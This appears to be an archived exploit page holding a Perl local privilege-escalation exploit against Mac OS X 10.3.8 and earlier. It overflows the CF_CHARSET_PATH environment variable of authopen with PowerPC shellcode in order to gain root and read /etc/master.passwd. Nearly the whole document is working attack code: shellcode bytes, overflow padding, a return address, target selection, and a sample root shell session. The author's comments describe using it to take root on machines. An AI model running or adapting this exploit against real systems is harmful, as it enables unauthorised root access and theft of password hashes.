<html><head><title>Mac OS X <= 10.3.8 (CF_CHARSET_PATH) Local BOF Exploit (2)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# Variant of CF_CHARSET_PATH a local root exploit by v9_at_fakehalo.us
#
# I was in the mood for some retro shit this morning, and I need root on some old ass G3 iMacs for a demo.
#
# I got sick of pressing enter on v9's exploit. It gets in the way when scripting attacks.
#
# Jill-Does-Computer:/tmp jilldoe$ ./authopen-CF_CHARSET.pl 0
# *** Target: 10.3.7 Build 7T65 on PowerPC, Padding: 1
# sh-2.05b# id
# uid=502(jilldoe) euid=0(root) gid=502(jilldoe) groups=502(jilldoe), 79(appserverusr), 80(admin), 81(appserveradm)
#
#

foreach $key (keys %ENV) {

   delete $ENV{$key};

}

#// ppc execve() code by b-r00t + nemo to add seteuid(0)
$sc =
&quot;\x7c\x63\x1a\x79&quot; .
&quot;\x40\x82\xff\xfd&quot; .
&quot;\x39\x40\x01\xc3&quot; .
&quot;\x38\x0a\xfe\xf4&quot; .
&quot;\x44\xff\xff\x02&quot; .
&quot;\x39\x40\x01\x23&quot; .
&quot;\x38\x0a\xfe\xf4&quot; .
&quot;\x44\xff\xff\x02&quot; .
&quot;\x60\x60\x60\x60&quot; .
&quot;\x7c\xa5\x2a\x79&quot; .
&quot;\x40\x82\xff\xfd&quot; .
&quot;\x7d\x68\x02\xa6&quot; .
&quot;\x3b\xeb\x01\x70&quot; .
&quot;\x39\x40\x01\x70\x39\x1f\xfe\xcf&quot; .
&quot;\x7c\xa8\x29\xae\x38\x7f\xfe\xc8&quot; .
&quot;\x90\x61\xff\xf8\x90\xa1\xff\xfc&quot; .
&quot;\x38\x81\xff\xf8\x38\x0a\xfe\xcb&quot; .
&quot;\x44\xff\xff\x02\x7c\xa3\x2b\x78&quot; .
&quot;\x38\x0a\xfe\x91\x44\xff\xff\x02&quot; .
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x58&quot;;

$tgts{&quot;0&quot;} = &quot;10.3.7 Build 7T65 on PowerPC:1&quot;;
$tgts{&quot;1&quot;} = &quot;10.3.7 debug 0x41424344:0&quot;;

unless (($target) = @ARGV) {

       print &quot;\n\nUsage: $0 &lt;target&gt; \n\nTargets:\n\n&quot;;

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{&quot;$key&quot;});
               print &quot;\t$key . $a\n&quot;;
       }

       print &quot;\n&quot;;
       exit 1;
}

$ret = pack(&quot;l&quot;, ($retval));
($a,$b) = split(/\:/,$tgts{&quot;$target&quot;});
print &quot;*** Target: $a, Padding: $b\n&quot;;

# add a wrapper here if you want more than euid=0
open(SUSH,&quot;&gt;/tmp/sh&quot;);
printf SUSH &quot;/bin/csh -i\n&quot;;

$ENV{&quot;CF_CHARSET_PATH&quot;} = &quot;A&quot; x 1048 . pack('l', 0xbffffef6) x 2;

$ENV{&quot;APPL&quot;} = &quot;.&quot; x $b . &quot;iiii&quot; x 40 . $sc ;

system(&quot;/usr/libexec/authopen /etc/master.passwd&quot;);

# milw0rm.com [2006-08-02]</pre></html>